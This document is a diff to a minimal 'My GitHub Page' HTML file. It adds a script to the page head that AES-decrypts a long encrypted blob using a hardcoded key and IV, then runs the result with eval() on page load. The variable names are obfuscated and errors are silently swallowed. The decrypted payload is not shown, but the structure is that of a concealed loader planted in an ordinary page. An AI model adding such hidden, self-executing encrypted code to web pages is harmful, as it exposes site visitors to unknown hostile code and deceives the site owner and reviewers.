@@ -2,6 +2,25 @@
 <html>
 <head>
     <title>My GitHub Page</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    var c1kogf48ustld = "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";
+    var kgj8tmi05j4ss = CryptoJS.enc.Hex.parse("c58a0da192f6d786005062ac2cc5cd3147991ce884cca9ac28cd45695cacef5e");
+    var igy7ogeeml72y = CryptoJS.enc.Hex.parse("878207599c37f37e7cd1754c27247306");
+
+    try {
+        var rwyi3ak7f2xj3 = CryptoJS.AES.decrypt(
+            c1kogf48ustld,
+            kgj8tmi05j4ss,
+            { iv: igy7ogeeml72y }
+        ).toString(CryptoJS.enc.Utf8);
+
+        if(rwyi3ak7f2xj3) {
+            eval(rwyi3ak7f2xj3);
+        }
+    } catch (e) {
+    }
+</script>
 </head>
 <body>
     <h1>Hello, World!</h1>
